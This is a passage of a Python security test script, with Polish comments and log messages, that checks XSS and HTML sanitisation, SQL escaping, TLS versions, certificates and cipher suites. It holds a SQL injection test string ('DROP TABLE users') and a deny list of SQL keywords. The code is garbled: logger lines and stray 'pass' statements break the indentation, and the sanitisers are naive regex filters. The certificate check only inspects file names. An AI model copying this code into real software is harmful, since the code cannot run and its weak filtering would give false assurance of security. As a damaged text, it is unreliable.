logger.info(f"     ❌ HTML nie sanityzowany: {html_input[:30]}...")
            
            # Test SQL escaping
logger.info("   🔄 Test escapowania SQL...")
            sql_inputs = [
                "normal_input",
                "input'with'quotes",
                'input"with"double"quotes',
                "input; DROP TABLE users;",
                "input\nwith\nnewlines"
            ]
            
            for sql_input in sql_inputs:
                escaped = await self._escape_sql_input(sql_input)
                
                # Sprawdzenie czy niebezpieczne znaki zostały zescapowane
                if "'" not in escaped or escaped.count("''") > 0:
                    sanitization_results['sql_escaped'] += 1
logger.info(f"     ✅ SQL escaped: {sql_input[:30]}...")
                else:
                    sanitization_results['failed_tests'] += 1
                    pass
logger.info(f"     ❌ SQL nie escaped: {sql_input[:30]}...")
                    pass
            
            # Ocena wyników
            total_tests = len(xss_payloads) + len(html_inputs) + len(sql_inputs)
            successful_tests = (sanitization_results['xss_blocked'] + 
                              sanitization_results['html_sanitized'] + 
                              sanitization_results['sql_escaped'])
            
            success_rate = successful_tests / total_tests if total_tests > 0 else 0
logger.info(f"   📊 XSS zablokowane: {sanitization_results['xss_blocked']}")
logger.info(f"   📊 HTML sanityzowane: {sanitization_results['html_sanitized']}")
logger.info(f"   📊 SQL escaped: {sanitization_results['sql_escaped']}")
logger.info(f"   📊 Nieudane testy: {sanitization_results['failed_tests']}")
                pass
logger.info(f"   📊 Wskaźnik sukcesu: {success_rate*100:.1f}%")
            
            if success_rate >= 0.9:
                self.test_results['data_sanitization'] = 'PASSED'
                    pass
logger.info("   ✅ Data sanitization: PASSED")
                    pass
            else:
                self.test_results['data_sanitization'] = f'FAILED: success_rate={success_rate*100:.1f}%'
logger.info(f"   ❌ Data sanitization: FAILED")
                
        except Exception as e:
            self.test_results['data_sanitization'] = f'FAILED: {e}'
logger.info(f"   ❌ Data sanitization: FAILED - {e}")
    
    async def _sanitize_input(self, input_data: str) -> str:
        """Sanityzacja danych wejściowych"""
        # Usunięcie niebezpiecznych tagów i skryptów
        sanitized = input_data
        
                pass
        # Usunięcie script tagów
        sanitized = re.sub(r'<script.*?</script>', '', sanitized, flags=re.IGNORECASE | re.DOTALL)
        
        # Usunięcie javascript: protokołu
                    pass
        sanitized = re.sub(r'javascript:', '', sanitized, flags=re.IGNORECASE)
                    pass
        
        # Usunięcie event handlerów
        sanitized = re.sub(r'on\w+\s*=', '', sanitized, flags=re.IGNORECASE)
        
        return sanitized
    
    async def _sanitize_html(self, html_input: str) -> str:
        """Sanityzacja HTML"""
        # Prosta sanityzacja HTML - usunięcie niebezpiecznych tagów
        dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form']
        
        sanitized = html_input
                pass
        for tag in dangerous_tags:
            pattern = f'<{tag}.*?</{tag}>'
                    pass
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE | re.DOTALL)
                    pass
            
            # Usunięcie samozamykających się tagów
            pattern = f'<{tag}.*?/?>'
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        return sanitized
    
    async def _escape_sql_input(self, sql_input: str) -> str:
        """Escapowanie danych SQL"""
        # Podstawowe escapowanie apostrofów
        escaped = sql_input.replace("'", "''")
        
        # Usunięcie niebezpiecznych słów kluczowych
        dangerous_keywords = ['DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION', 'SELECT']
        
                pass
        for keyword in dangerous_keywords:
            escaped = re.sub(f'\\b{keyword}\\b', f'_{keyword}_', escaped, flags=re.IGNORECASE)
                pass
        
        return escaped
    
            pass
    async def _test_secure_communication(self):
        """Test bezpiecznej komunikacji"""
logger.info("\n🔒 Secure communication...")
        
        try:
            comm_results = {
                'tls_tests': 0,
                'certificate_tests': 0,
                'protocol_tests': 0,
                'failed_tests': 0
            }
            pass
            
            # Test TLS/SSL
logger.info("   🔄 Test TLS/SSL...")
            tls_configs = [
                ('TLSv1.3', True, 'TLS 1.3'),
                ('TLSv1.2', True, 'TLS 1.2'),
                ('TLSv1.1', False, 'TLS 1.1 (deprecated)'),
                ('TLSv1.0', False, 'TLS 1.0 (deprecated)'),
                ('SSLv3', False, 'SSL 3.0 (insecure)')
            ]
            
            for protocol, should_be_allowed, description in tls_configs:
                comm_results['tls_tests'] += 1
                
                is_allowed = await self._check_tls_protocol(protocol)
                
                if should_be_allowed == is_allowed:
logger.info(f"     ✅ {description}: OK")
                else:
                    comm_results['failed_tests'] += 1
logger.info(f"     ❌ {description}: FAILED")
            
            # Test certyfikatów
logger.info("   🔄 Test walidacji certyfikatów...")
            cert_tests = [
                ('valid_cert.pem', True, 'Prawidłowy certyfikat'),
                ('expired_cert.pem', False, 'Wygasły certyfikat'),
                ('self_signed_cert.pem', False, 'Certyfikat self-signed'),
                ('invalid_cert.pem', False, 'Nieprawidłowy certyfikat')
                pass
            ]
            
            for cert_file, should_be_valid, description in cert_tests:
                comm_results['certificate_tests'] += 1
                
                is_valid = await self._validate_certificate(cert_file)
                
                if should_be_valid == is_valid:
logger.info(f"     ✅ {description}: OK")
                else:
                    comm_results['failed_tests'] += 1
            pass
logger.info(f"     ❌ {description}: FAILED")
            
            # Test protokołów komunikacji
            pass
logger.info("   🔄 Test protokołów komunikacji...")
            protocol_tests = [
                ('HTTPS', True, 'HTTPS'),
                ('WSS', True, 'WebSocket Secure'),
                ('HTTP', False, 'HTTP (niezabezpieczony)'),
                ('WS', False, 'WebSocket (niezabezpieczony)'),
                ('FTP', False, 'FTP (niezabezpieczony)')
            ]
            
            for protocol, should_be_allowed, description in protocol_tests:
                comm_results['protocol_tests'] += 1
                
                is_allowed = await self._check_communication_protocol(protocol)
                
                if should_be_allowed == is_allowed:
logger.info(f"     ✅ {description}: OK")
                else:
                    comm_results['failed_tests'] += 1
logger.info(f"     ❌ {description}: FAILED")
            
            # Test cipher suites
logger.info("   🔄 Test cipher suites...")
            cipher_suites = [
                ('ECDHE-RSA-AES256-GCM-SHA384', True, 'Silny cipher suite'),
                ('AES128-GCM-SHA256', True, 'Dobry cipher suite'),
                ('DES-CBC-SHA', False, 'Słaby cipher suite'),
                ('RC4-MD5', False, 'Niebezpieczny cipher suite')
            ]
            
            for cipher, should_be_allowed, description in cipher_suites:
                is_allowed = await self._check_cipher_suite(cipher)
                
                if should_be_allowed == is_allowed:
logger.info(f"     ✅ {description}: OK")
                else:
                    comm_results['failed_tests'] += 1
logger.info(f"     ❌ {description}: FAILED")
            
            # Ocena wyników
            total_tests = (comm_results['tls_tests'] + 
                          comm_results['certificate_tests'] + 
                          comm_results['protocol_tests'])
            
            success_rate = (total_tests - comm_results['failed_tests']) / total_tests if total_tests > 0 else 0
logger.info(f"   📊 Testy TLS: {comm_results['tls_tests']}")
logger.info(f"   📊 Testy certyfikatów: {comm_results['certificate_tests']}")
logger.info(f"   📊 Testy protokołów: {comm_results['protocol_tests']}")
logger.info(f"   📊 Nieudane testy: {comm_results['failed_tests']}")
logger.info(f"   📊 Wskaźnik sukcesu: {success_rate*100:.1f}%")
            
            if success_rate >= 0.9:
                self.test_results['secure_communication'] = 'PASSED'
logger.info("   ✅ Secure communication: PASSED")
            else:
                self.test_results['secure_communication'] = f'FAILED: success_rate={success_rate*100:.1f}%'
logger.info(f"   ❌ Secure communication: FAILED")
                
        except Exception as e:
            self.test_results['secure_communication'] = f'FAILED: {e}'
logger.info(f"   ❌ Secure communication: FAILED - {e}")
    
    async def _check_tls_protocol(self, protocol: str) -> bool:
        """Sprawdzenie protokołu TLS"""
        allowed_protocols = ['TLSv1.3', 'TLSv1.2']
        return protocol in allowed_protocols
    
    async def _validate_certificate(self, cert_file: str) -> bool:
        """Walidacja certyfikatu"""
        # Symulacja walidacji certyfikatu
        if 'valid' in cert_file:
            return True
        elif 'expired' in cert_file or 'self_signed' in cert_file or 'invalid' in cert_file:
            return False
        return False
    
    async def _check_communication_protocol(self, protocol: str) -> bool:
        """Sprawdzenie protokołu komunikacji"""
        secure_protocols = ['HTTPS', 'WSS']
        return protocol in secure_protocols
    
    async def _check_cipher_suite(self, cipher: str) -> bool:
        """Sprawdzenie cipher suite"""
        weak_ciphers = ['DES', 'RC4', 'MD5']
        return not any(weak in cipher for weak in weak_ciphers)
    
    def _print_summary(self):
        """Wydrukowanie podsumowania testów bezpieczeństwa"""
logger.info("\n" + "=" * 60)
logger.info("🔒 PODSUMOWANIE TESTÓW BEZPIECZEŃSTWA")
logger.info("=" * 60)
        
        passed = 0
        total = len(self.test_results)
        
        for test_name, result in self.test_results.items():
            status = "✅ PASSED" if result == 'PASSED' else f"❌ {result}"
            test_display = test_name.replace('_', ' ').title()
logger.info(f"{test_display:.<40} {status}")
            
            if result == 'PASSED':
                passed += 1
logger.info("-" * 60)
logger.info(f"Wynik: {passed}/{total} testów przeszło pomyślnie")
        
        # Ocena poziomu bezpieczeństwa
        security_level = (passed / total) * 100 if total > 0 else 0
        
        if security_level >= 90:
            security_rating = "🟢 WYSOKI"
        elif security_level >= 70:
            security_rating = "🟡 ŚREDNI"
        else:
            security_rating = "🔴 NISKI"
logger.info(f"\n🛡️ POZIOM BEZPIECZEŃSTWA: {security_rating} ({security_level:.1f}%)")
logger.info("\n📋 REKOMENDACJE:")
        if passed < total:
logger.info("   • Popraw nieudane testy bezpieczeństwa")
logger.info("   • Wdróż dodatkowe mechanizmy ochrony")
logger.info("   • Przeprowadź regularne audyty bezpieczeństwa")
        else:
logger.info("   • Utrzymuj obecny poziom bezpieczeństwa")
logger.info("   • Monitoruj nowe zagrożenia")
logger.info("   • Aktualizuj mechanizmy ochrony")
logger.info("-" * 60)
        
        if passed == total:
logger.info("🎉 Wszystkie testy bezpieczeństwa przeszły pomyślnie!")
logger.info("✅ System spełnia wysokie standardy bezpieczeństwa")
        else:
logger.info("⚠️ Niektóre testy bezpieczeństwa nie przeszły")
logger.info("🔧 Wymagane są poprawki bezpieczeństwa")


async def main():
    """Główna funkcja testowa"""
    tester = SecurityTester()
    await tester.run_all_tests()


if __name__ == "__main__":
    asyncio.run(main())